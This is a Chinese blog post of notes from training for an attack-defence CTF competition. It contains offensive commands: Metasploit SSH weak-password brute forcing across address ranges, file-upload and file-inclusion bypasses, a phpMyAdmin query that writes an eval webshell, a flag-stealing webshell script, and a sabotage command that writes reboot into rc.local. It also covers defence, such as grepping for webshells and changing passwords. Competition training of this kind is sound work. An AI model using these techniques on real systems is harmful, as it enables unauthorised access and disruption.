@@ -1,0 +1,680 @@
+
+ <!DOCTYPE HTML>
+<html lang="cn-zh">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>神码选拔赛培训总结 | GetFlag&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="GetFlag">
+    
+
+    
+    <meta name="description" content="去选拔赛的主办院校，经过了一下午和一上午的培训，时间很短但是对于国赛三阶段来说已经足够了，之前在基础的漏洞方面，owasptop10原理已经了解的比较透彻了，主要欠缺的就是一些思路，而这次培训正好给提供了这些思路，让我对三阶段有了一个不一样的认识(难度不大，出题老套，对熟练度的考试要求更高)，总的来说受益匪浅。">
+<meta name="keywords" content="AWD,python,攻击脚本,猥琐思路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="神码选拔赛培训总结">
+<meta property="og:url" content="http://flag0.com/2018/04/04/山东电子培训总结/index.html">
+<meta property="og:site_name" content="GetFlag&#39;s Blog">
+<meta property="og:description" content="去选拔赛的主办院校，经过了一下午和一上午的培训，时间很短但是对于国赛三阶段来说已经足够了，之前在基础的漏洞方面，owasptop10原理已经了解的比较透彻了，主要欠缺的就是一些思路，而这次培训正好给提供了这些思路，让我对三阶段有了一个不一样的认识(难度不大，出题老套，对熟练度的考试要求更高)，总的来说受益匪浅。">
+<meta property="og:locale" content="cn-zh">
+<meta property="og:updated_time" content="2018-04-10T03:00:14.277Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="神码选拔赛培训总结">
+<meta name="twitter:description" content="去选拔赛的主办院校，经过了一下午和一上午的培训，时间很短但是对于国赛三阶段来说已经足够了，之前在基础的漏洞方面，owasptop10原理已经了解的比较透彻了，主要欠缺的就是一些思路，而这次培训正好给提供了这些思路，让我对三阶段有了一个不一样的认识(难度不大，出题老套，对熟练度的考试要求更高)，总的来说受益匪浅。">
+
+    
+    <link rel="alternative" href="/atom.xml" title="GetFlag&#39;s Blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="GetFlag&#39;s Blog">GetFlag&#39;s Blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:flag0.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/04/04/山东电子培训总结/" title="神码选拔赛培训总结" itemprop="url">神码选拔赛培训总结</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
+		
+  <p class="article-time">
+    <time datetime="2018-04-04T14:00:03.000Z" itemprop="datePublished"> 发表于 2018-04-04</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第二阶段"><span class="toc-number">1.</span> <span class="toc-text">第二阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#提交模式如下："><span class="toc-number">1.1.</span> <span class="toc-text">提交模式如下：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#学习备赛"><span class="toc-number">1.2.</span> <span class="toc-text">学习备赛</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三阶段"><span class="toc-number">2.</span> <span class="toc-text">第三阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#比赛流程推荐-分工去做"><span class="toc-number">2.1.</span> <span class="toc-text">比赛流程推荐(分工去做)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及技术和命令"><span class="toc-number">2.2.</span> <span class="toc-text">涉及技术和命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#培训学习"><span class="toc-number">2.3.</span> <span class="toc-text">培训学习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#上传漏洞"><span class="toc-number">2.3.1.</span> <span class="toc-text">上传漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件包含"><span class="toc-number">2.3.2.</span> <span class="toc-text">文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行"><span class="toc-number">2.4.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpmyadmin"><span class="toc-number">2.5.</span> <span class="toc-text">phpmyadmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17国赛三阶段文件解析"><span class="toc-number">2.6.</span> <span class="toc-text">17国赛三阶段文件解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#比赛环境方面"><span class="toc-number">2.7.</span> <span class="toc-text">比赛环境方面</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#重点总结"><span class="toc-number">3.</span> <span class="toc-text">重点总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关材料："><span class="toc-number">4.</span> <span class="toc-text">相关材料：</span></a></li></ol>
+		
+		</div>
+		
+		<p>去选拔赛的主办院校，经过了一下午和一上午的培训，时间很短但是对于国赛三阶段来说已经足够了，之前在基础的漏洞方面，owasptop10原理已经了解的比较透彻了，主要欠缺的就是一些思路，而这次培训正好给提供了这些思路，让我对三阶段有了一个不一样的认识(难度不大，出题老套，对熟练度的考试要求更高)，总的来说受益匪浅。</p>
+<a id="more"></a>
+<h2 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h2><p>第二阶段分两种提交方式,截图提交和系统提交,截图提交为常规提交模式，web这块一定要注意程序逻辑的正确性</p>
+<h3 id="提交模式如下："><a href="#提交模式如下：" class="headerlink" title="提交模式如下："></a>提交模式如下：</h3><p>针对提交模式特性：</p>
+<ul>
+<li>可重复提交</li>
+<li>只有正确时才会提示</li>
+<li>间隔10S</li>
+</ul>
+<p>策略和注意点：</p>
+<ul>
+<li>对于不确切的答案，可以采用多次重复提交的方式，用burpsuite intruder进行爆破，也可以用python写爆破脚本</li>
+<li>再提交时一定要注意大小写的问题，提交模式下必须100%正确才能拿分</li>
+</ul>
+<p>ps:搜索php.ini （当未在默认目录）</p>
+<h3 id="学习备赛"><a href="#学习备赛" class="headerlink" title="学习备赛"></a>学习备赛</h3><p>当国赛真题出来之后，按知识点搜索学习，针对性点对点的学习，提升深度</p>
+<p>例如17国赛的python相关</p>
+<p>在学习时熟悉python idle使用 help等命令，锻炼面对未知模块的快速适应能力<br>,可以用用kali中的Ipython快速补全，也可以构造自动补全的python shell</p>
+<p>python shell</p>
+<pre><code>&gt;&gt;&gt; import rlcompleter  
+&gt;&gt;&gt; import readline  
+&gt;&gt;&gt; readline.parse_and_bind(&quot;tab: complete&quot;)  
+</code></pre><p>在本地安装时会出现</p>
+<pre><code>error: this module is not meant to work on Windows
+</code></pre><p>不支持windows ，也就是不能在沙盒环境中使用(沙盒中类似的python补全代码应该时windows)<br>可以在kali python shell命令行中输入以上命令然后,就可以自动补全</p>
+<pre><code>&gt;&gt;&gt; import base64
+&gt;&gt;&gt; base64.
+base64.EMPTYSTRING                  base64._translation
+base64.MAXBINSIZE                   base64._urlsafe_decode_translation
+base64.MAXLINESIZE                  base64._urlsafe_encode_translation
+base64.__all__                      base64._x
+base64.__class__(                   base64.b16decode(
+base64.__delattr__(                 base64.b16encode(
+base64.__dict__                     base64.b32decode(
+base64.__doc__                      base64.b32encode(
+base64.__file__                     base64.b64decode(
+base64.__format__(                  base64.b64encode(
+base64.__getattribute__(            base64.binascii
+base64.__hash__(                    base64.decode(
+base64.__init__(                    base64.decodestring(
+base64.__name__                     base64.encode(
+base64.__new__(                     base64.encodestring(
+base64.__package__                  base64.k
+base64.__reduce__(                  base64.re
+base64.__reduce_ex__(               base64.standard_b64decode(
+base64.__repr__(                    base64.standard_b64encode(
+base64.__setattr__(                 base64.string
+base64.__sizeof__(                  base64.struct
+base64.__str__(                     base64.test(
+base64.__subclasshook__(            base64.test1(
+base64._b32alphabet                 base64.urlsafe_b64decode(
+base64._b32rev                      base64.urlsafe_b64encode(
+base64._b32tab                      base64.v
+base64._translate(                  
+</code></pre><p>推荐使用ipython</p>
+<h2 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h2><h3 id="比赛流程推荐-分工去做"><a href="#比赛流程推荐-分工去做" class="headerlink" title="比赛流程推荐(分工去做)"></a>比赛流程推荐(分工去做)</h3><ul>
+<li>1.查看本地用户，并尝试登陆ssh弱口令用户和mysql弱口令用户(ssh默认弱口令123456 mysql从web文件查看,登陆成功后记录以备后期批量扫描)</li>
+<li>2.改密码 ssh root用户和非root用户、mysql用户密码 查看历史操作命令history(可能发现工程师布置环境使用的命令)</li>
+<li>3.备份源代码 审计寻找可利用漏洞 并删除web源代码</li>
+<li>4.扫描nmap 服务器，查看靶机系统开放端口(包括常用端口+漏洞端口+后门端口)</li>
+<li>5.系统漏洞 用软连接修补漏洞 或者 杀掉新开进程(可以编写shell脚本自动化杀进程)</li>
+<li>6.编写脚本批量(web 漏洞)和flag批量提交脚本</li>
+</ul>
+<h3 id="涉及技术和命令"><a href="#涉及技术和命令" class="headerlink" title="涉及技术和命令"></a>涉及技术和命令</h3><p>密码修改(一次只能修改一个用户)</p>
+<pre><code>echo &quot;213456&quot; | passwd --stdin root
+</code></pre><p>查看拥有bash权限用户</p>
+<pre><code>cat /etc/passwd | grep &apos;bash&apos;
+</code></pre><p>crt 登陆弱口令用户<br>登陆mysql弱口令用户</p>
+<pre><code>mysql -u用户名 -p
+</code></pre><p>查找webshell后门</p>
+<pre><code>grep -r &quot;eval($_POST&quot;
+grep -r &quot;arrey_map&quot;
+</code></pre><p>web目录保存位置</p>
+<pre><code>/var/html/www
+home/www/html
+</code></pre><p>服务器端口扫描</p>
+<pre><code>nmap 快速扫描
+</code></pre><p>ssh弱口令批量攻击</p>
+<pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_login
+msf auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.1-255.1
+rhosts =&gt; 192.168.1-255.1
+msf auxiliary(scanner/ssh/ssh_login) &gt; set username root
+username =&gt; root
+msf auxiliary(scanner/ssh/ssh_login) &gt; set password 123456
+password =&gt; 123456
+msf auxiliary(scanner/ssh/ssh_login) &gt; run
+</code></pre><p>mysql弱口令批量攻击</p>
+<pre><code>msf &gt; use auxiliary/scanner/mysql/mysql_login 
+</code></pre><p>系统后门<br>    nc、telnet 等</p>
+<p>杀端口</p>
+<pre><code>kali -9 pid
+</code></pre><p>软连接</p>
+<pre><code>一个服务可以分身多个端口，用于替换存在漏洞的服务
+ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=10001
+</code></pre><p>缓冲区溢出漏洞利用</p>
+<pre><code>常见漏洞列表收集
+</code></pre><p>删除flag</p>
+<pre><code>chattrr -i 删除flag  剔除idd权限
+flag明文文件都是存在靶机内通过程序随机加密
+</code></pre><h3 id="培训学习"><a href="#培训学习" class="headerlink" title="培训学习"></a>培训学习</h3><h4 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h4><p>各种简单绕过</p>
+<p><b>1.本地js验证</b></p>
+<pre><code>删除调用部分
+</code></pre><p><b>2.大小写绕过</b></p>
+<pre><code>找上传到的路径，burpsuite，或者查看源代码
+strtolower防御
+</code></pre><p><b>3.双重后缀名绕过(apache解析漏洞结合)</b></p>
+<pre><code>shell.php.x
+burp 后缀名加空格
+</code></pre><p><b>4.过滤绕过</b></p>
+<pre><code>pphphp
+</code></pre><p><b>5.特殊后缀名(特殊的php版本的问题)</b></p>
+<pre><code>类似于htaccess
+php3 4 5 6可以执行
+</code></pre><p><b>6.文件流判断类型</b></p>
+<pre><code>验证Content-type
+</code></pre><p><b>7.文件重写漏洞</b></p>
+<pre><code>上传覆盖掉htaccess
+</code></pre><p><b>8.IIS6.0解析漏洞绕过</b></p>
+<p><b>9.%00截断上传</b></p>
+<pre><code>php5.34以下存在漏洞
+相关文章：https://blog.csdn.net/p656456564545/article/details/17883305
+</code></pre><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>ps:快速代码审计 遍历高危函数<br>遍历 include 函数</p>
+<p><b>1.include $_ GET() .”.php”绕过思路  （%00截断）空</b></p>
+<p>环境要求：</p>
+<pre><code>php&lt;=5.3.4
+magic_quotes_gpc(魔术引号) 为OFF
+</code></pre><p><b>2.远程文件包含</b></p>
+<pre><code>allow_url_fopen On
+allow_url_include On
+用？ 或者%00截断
+</code></pre><p><b>3.php伪协议 base64读取</b></p>
+<pre><code>php://filter/read=convert.base64-encode/resource=index.php
+</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p><b>1.system get</b><br>直接执行构造<br><b>2.ping system</b></p>
+<pre><code>常用cmd命令符号 &amp; | &amp;&amp; ||
+</code></pre><p><b>3.dcn 页面漏洞 XSS</b></p>
+<p><b>4.通过eval 与 system结合代码执行 导致命令执行</b></p>
+<pre><code>&lt;?php
+
+$fun=$_GET(&apos;fun&apos;);
+$far=$_GET(&apos;far&apos;);
+fun(far);
+?&gt;
+</code></pre><p>传值fun=system<br>    far=”dir”</p>
+<p><b>5.拼接过安全狗</b><br>利用4中的原理进行花式拼接</p>
+<p>escapeshellcmd() 过滤防护</p>
+<h3 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h3><p>导出一句话木马</p>
+<pre><code>select&apos;&lt;?php @eval($_POST[-77]);?&gt;&apos;INTO OUTFILE &apos;/var/www/html/shell.php&apos;
+</code></pre><h3 id="17国赛三阶段文件解析"><a href="#17国赛三阶段文件解析" class="headerlink" title="17国赛三阶段文件解析"></a>17国赛三阶段文件解析</h3><p>17国赛文件上传中的，上传到目录没有权限，可用于共享文件<br>webshell  命令执行<br>filesharing  上传文件<br>download file 下载文件<br>Displayctrl  类似于ping 命令执行</p>
+<h3 id="比赛环境方面"><a href="#比赛环境方面" class="headerlink" title="比赛环境方面"></a>比赛环境方面</h3><p>靶机大都使用较老版本linux服务器，不会使用centOS7<br>攻击机大概率会是老版本BT5</p>
+<h2 id="重点总结"><a href="#重点总结" class="headerlink" title="重点总结"></a>重点总结</h2><p>1.攻击可以使用破坏性手段(不会溯源,自启动文件写reboot)</p>
+<pre><code>echo &quot;reboot&quot; &gt; /etc/rc.local
+reboot
+</code></pre><p>2.使用软连接分身替换web端口和其他漏洞服务端口<br>3.快速攻击框架</p>
+<pre><code>#!/usr/bin/env python3
+#-*-coding:utf-8-*-
+#version:3.6.4
+__author__ = &apos;杜文涛&apos;
+
+import requests
+import re
+
+try:
+    for i in range(0,1):
+        url = &quot;http://127.0.&quot;+str(i)+&quot;.1:8080/html/WebShell.php?cmd=cat+*flag*&quot;
+
+
+        response = requests.get(url)
+        response.encoding=&apos;utf-8&apos;
+        html = response.text
+
+        content = re.findall(r&quot;&lt;input.*?name=\&quot;(.*?)\&quot;/&gt;&quot;,html,re.S|re.M)[0]
+        print(content)
+except:
+    pass
+</code></pre><p>4.kali 有可能访问不到别人的靶机  网关一定要对  桥接   (nat能够访问就可以)</p>
+<p>5.删除flag生成文件</p>
+<pre><code>#/usr/bin/python
+import os
+os.system(&quot;chattrr -i flag*&quot;)
+while(1):
+    os.system(&quot;rm -f flag*&quot;)
+</code></pre><p>6.国赛有一次警告机会，要大胆尝试</p>
+<h2 id="相关材料："><a href="#相关材料：" class="headerlink" title="相关材料："></a>相关材料：</h2><pre><code>工程师博客            http://blog.51cto.com/tdcqvip
+Python shell自动补齐  https://blog.csdn.net/orends/article/details/42653739
+</code></pre>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/AWD/">AWD</a><a href="/tags/python/">python</a><a href="/tags/攻击脚本/">攻击脚本</a><a href="/tags/猥琐思路/">猥琐思路</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://flag0.com/2018/04/04/山东电子培训总结/" data-title="神码选拔赛培训总结 | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2018/03/26/python自动化测试会长测评/"  title="python+selenium实现自动化会长测评">
+ <strong>下一篇：</strong><br/> 
+ <span>python+selenium实现自动化会长测评
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第二阶段"><span class="toc-number">1.</span> <span class="toc-text">第二阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#提交模式如下："><span class="toc-number">1.1.</span> <span class="toc-text">提交模式如下：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#学习备赛"><span class="toc-number">1.2.</span> <span class="toc-text">学习备赛</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三阶段"><span class="toc-number">2.</span> <span class="toc-text">第三阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#比赛流程推荐-分工去做"><span class="toc-number">2.1.</span> <span class="toc-text">比赛流程推荐(分工去做)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及技术和命令"><span class="toc-number">2.2.</span> <span class="toc-text">涉及技术和命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#培训学习"><span class="toc-number">2.3.</span> <span class="toc-text">培训学习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#上传漏洞"><span class="toc-number">2.3.1.</span> <span class="toc-text">上传漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件包含"><span class="toc-number">2.3.2.</span> <span class="toc-text">文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行"><span class="toc-number">2.4.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpmyadmin"><span class="toc-number">2.5.</span> <span class="toc-text">phpmyadmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17国赛三阶段文件解析"><span class="toc-number">2.6.</span> <span class="toc-text">17国赛三阶段文件解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#比赛环境方面"><span class="toc-number">2.7.</span> <span class="toc-text">比赛环境方面</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#重点总结"><span class="toc-number">3.</span> <span class="toc-text">重点总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关材料："><span class="toc-number">4.</span> <span class="toc-text">相关材料：</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/安全竞赛/" title="安全竞赛">安全竞赛<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/编程开发/" title="编程开发">编程开发<sup>4</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻击脚本/" title="攻击脚本">攻击脚本<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/docker/" title="docker">docker<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php/" title="php">php<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Writeup/" title="Writeup">Writeup<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/selenium/" title="selenium">selenium<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/自动化/" title="自动化">自动化<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Wireshark/" title="Wireshark">Wireshark<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/XAMPP/" title="XAMPP">XAMPP<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/error/" title="error">error<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/猥琐思路/" title="猥琐思路">猥琐思路<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/pdo/" title="pdo">pdo<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://www.cnblogs.com/test404" target="_blank" title="胖虎">胖虎</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> Rise and rise again until lambs become lions <br/>
+			Everyone can cook, but only those who dare to try can become the real chef.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		<a href="https://github.com/https://github.com/flag0" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:root@flag0.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
+		
+		<a href="/about" target="_blank" title="GetFlag">GetFlag</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
